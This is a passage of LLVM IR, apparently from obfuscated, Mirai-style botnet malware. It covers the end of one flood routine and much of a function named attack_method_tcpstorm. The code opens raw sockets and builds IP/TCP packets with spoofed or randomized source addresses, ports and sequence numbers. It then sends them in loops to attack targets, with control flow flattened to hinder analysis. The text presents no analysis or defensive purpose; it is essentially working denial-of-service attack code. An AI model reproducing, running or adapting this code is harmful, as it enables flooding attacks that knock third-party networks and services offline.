  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 343859410, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -1718609515, i32 1848794256
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 1848794256, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 1628643220, i32 1435871756
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 1435871756, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 -1186207103, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 747507772, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 372847046, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 1)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 1458)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1284014858, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1284014858, label %first
    i32 1159776369, label %109
    i32 -2049758868, label %110
    i32 -1361861011, label %116
    i32 1028556195, label %119
    i32 -1213437581, label %120
    i32 16224269, label %126
    i32 -1046191233, label %174
    i32 -1074985530, label %178
    i32 310367655, label %270
    i32 -472623241, label %273
    i32 1507227003, label %274
    i32 -1391203813, label %275
    i32 361320946, label %281
    i32 -641603808, label %304
    i32 -384578542, label %325
    i32 2055055982, label %329
    i32 -1992369472, label %333
    i32 381940375, label %338
    i32 -898956778, label %344
    i32 2023764557, label %349
    i32 -203441892, label %355
    i32 711656450, label %360
    i32 1854202444, label %366
    i32 -1084550523, label %370
    i32 69545067, label %374
    i32 224507219, label %378
    i32 -2042619985, label %382
    i32 1755339208, label %386
    i32 -827761533, label %389
    i32 509933515, label %438
    i32 1140614579, label %441
    i32 100249923, label %442
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %107 = icmp eq i32 %.reload, -1
  %108 = select i1 %107, i32 1159776369, i32 -2049758868
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 100249923, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %111 = load i32, i32* %10, align 4
  %112 = bitcast i32* %9 to i8*
  %113 = call i32 @setsockopt(i32 %111, i32 0, i32 3, i8* %112, i32 4) #6
  %114 = icmp eq i32 %113, -1
  %115 = select i1 %114, i32 -1361861011, i32 1028556195
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  store i32 100249923, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1213437581, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = select i1 %124, i32 16224269, i32 -472623241
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  store i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.257, i32 0, i32 0), i8** %31, align 8
  %127 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  store i8* %127, i8** %131, align 8
  %132 = load i8**, i8*** %11, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8*, i8** %132, i64 %134
  %136 = load i8*, i8** %135, align 8
  %137 = bitcast i8* %136 to %struct.iphdr*
  store %struct.iphdr* %137, %struct.iphdr** %29, align 8
  %138 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i64 1
  %140 = bitcast %struct.iphdr* %139 to %struct.tcphdr*
  store %struct.tcphdr* %140, %struct.tcphdr** %30, align 8
  %141 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i64 124
  %143 = bitcast %struct.tcphdr* %142 to i8*
  store i8* %143, i8** %31, align 8
  %144 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %145 = bitcast %struct.iphdr* %144 to i8*
  %146 = load i8, i8* %145, align 4
  %147 = and i8 %146, 15
  %148 = or i8 %147, 64
  store i8 %148, i8* %145, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, -16
  %153 = or i8 %152, 5
  store i8 %153, i8* %150, align 4
  %154 = load i8, i8* %12, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 1
  store i8 %154, i8* %156, align 1
  %157 = load i32, i32* %26, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 40, %158
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  %173 = select i1 %172, i32 -1046191233, i32 -1074985530
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  store i32 -1074985530, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 6
  store i8 6, i8* %180, align 1
  %181 = load i32, i32* %28, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 8
  store i32 %181, i32* %183, align 4
  %184 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i64 %186
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i32 0, i32 1
  %189 = load i32, i32* %188, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 9
  store i32 %189, i32* %191, align 4
  %192 = load i16, i16* %16, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  store i16 %193, i16* %195, align 4
  %196 = load i16, i16* %17, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 1
  store i16 %197, i16* %199, align 2
  %200 = load i32, i32* %18, align 4
  %201 = trunc i32 %200 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = zext i16 %202 to i32
  %204 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 2
  store i32 %203, i32* %205, align 4
  %206 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %207 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -241
  %210 = or i16 %209, 160
  store i16 %210, i16* %207, align 4
  %211 = load i8, i8* %20, align 1
  %212 = sext i8 %211 to i16
  %213 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 4
  %215 = load i16, i16* %214, align 4
  %216 = and i16 %212, 1
  %217 = shl i16 %216, 13
  %218 = and i16 %215, -8193
  %219 = or i16 %218, %217
  store i16 %219, i16* %214, align 4
  %220 = load i8, i8* %21, align 1
  %221 = sext i8 %220 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 4
  %224 = load i16, i16* %223, align 4
  %225 = and i16 %221, 1
  %226 = shl i16 %225, 12
  %227 = and i16 %224, -4097
  %228 = or i16 %227, %226
  store i16 %228, i16* %223, align 4
  %229 = load i8, i8* %22, align 1
  %230 = sext i8 %229 to i16
  %231 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %232 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %230, 1
  %235 = shl i16 %234, 11
  %236 = and i16 %233, -2049
  %237 = or i16 %236, %235
  store i16 %237, i16* %232, align 4
  %238 = load i8, i8* %23, align 1
  %239 = sext i8 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 4
  %242 = load i16, i16* %241, align 4
  %243 = and i16 %239, 1
  %244 = shl i16 %243, 10
  %245 = and i16 %242, -1025
  %246 = or i16 %245, %244
  store i16 %246, i16* %241, align 4
  %247 = load i8, i8* %24, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 9
  %254 = and i16 %251, -513
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %25, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 8
  %263 = and i16 %260, -257
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = call i32 @rand() #6
  %266 = srem i32 %265, 65535
  %267 = trunc i32 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 5
  store i16 %267, i16* %269, align 2
  store i32 310367655, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, 1
  store i32 %272, i32* %9, align 4
  store i32 -1213437581, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  store i32 1507227003, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1391203813, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %9, align 4
  %277 = load i8, i8* %5, align 1
  %278 = zext i8 %277 to i32
  %279 = icmp slt i32 %276, %278
  %280 = select i1 %279, i32 361320946, i32 1140614579
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8**, i8*** %11, align 8
  %283 = load i32, i32* %9, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8*, i8** %282, i64 %284
  %286 = load i8*, i8** %285, align 8
  store i8* %286, i8** %32, align 8
  %287 = load i8*, i8** %32, align 8
  %288 = bitcast i8* %287 to %struct.iphdr*
  store %struct.iphdr* %288, %struct.iphdr** %33, align 8
  %289 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i64 1
  %291 = bitcast %struct.iphdr* %290 to %struct.tcphdr*
  store %struct.tcphdr* %291, %struct.tcphdr** %34, align 8
  %292 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i64 1
  %294 = bitcast %struct.tcphdr* %293 to i8*
  store i8* %294, i8** %35, align 8
  %295 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %296 = load i32, i32* %9, align 4
  %297 = sext i32 %296 to i64
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %295, i64 %297
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i32 0, i32 2
  %300 = load i8, i8* %299, align 4
  %301 = zext i8 %300 to i32
  %302 = icmp slt i32 %301, 32
  %303 = select i1 %302, i32 -641603808, i32 -384578542
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i32 0, i32 1
  %310 = load i32, i32* %309, align 4
  %311 = call i32 @ntohl(i32 %310) #7
  %312 = call i32 @rand_next()
  %313 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %314 = load i32, i32* %9, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %316, i32 0, i32 2
  %318 = load i8, i8* %317, align 4
  %319 = zext i8 %318 to i32
  %320 = lshr i32 %312, %319
  %321 = add i32 %311, %320
  %322 = call i32 @htonl(i32 %321) #7
  %323 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 9
  store i32 %322, i32* %324, align 4
  store i32 -384578542, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i32, i32* %28, align 4
  %327 = icmp eq i32 %326, -1
  %328 = select i1 %327, i32 2055055982, i32 -1992369472
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = call i32 @rand_next()
  %331 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 8
  store i32 %330, i32* %332, align 4
  store i32 -1992369472, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i16, i16* %13, align 2
  %335 = zext i16 %334 to i32
  %336 = icmp eq i32 %335, 65535
  %337 = select i1 %336, i32 381940375, i32 -898956778
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = call i32 @rand_next()
  %340 = and i32 %339, 65535
  %341 = trunc i32 %340 to i16
  %342 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 3
  store i16 %341, i16* %343, align 4
  store i32 -898956778, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i16, i16* %16, align 2
  %346 = zext i16 %345 to i32
  %347 = icmp eq i32 %346, 65535
  %348 = select i1 %347, i32 2023764557, i32 -203441892
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = call i32 @rand_next()
  %351 = and i32 %350, 65535
  %352 = trunc i32 %351 to i16
  %353 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %354 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %353, i32 0, i32 0
  store i16 %352, i16* %354, align 4
  store i32 -203441892, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i16, i16* %17, align 2
  %357 = zext i16 %356 to i32
  %358 = icmp eq i32 %357, 65535
  %359 = select i1 %358, i32 711656450, i32 1854202444
  store i32 %359, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = call i32 @rand_next()
  %362 = and i32 %361, 65535
  %363 = trunc i32 %362 to i16
  %364 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 1
  store i16 %363, i16* %365, align 2
  store i32 1854202444, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %18, align 4
  %368 = icmp eq i32 %367, 65535
  %369 = select i1 %368, i32 -1084550523, i32 69545067
  store i32 %369, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = call i32 @rand_next()
  %372 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %373 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %372, i32 0, i32 2
  store i32 %371, i32* %373, align 4
  store i32 69545067, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i32, i32* %19, align 4
  %376 = icmp eq i32 %375, 65535
  %377 = select i1 %376, i32 224507219, i32 -2042619985
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = call i32 @rand_next()
  %380 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
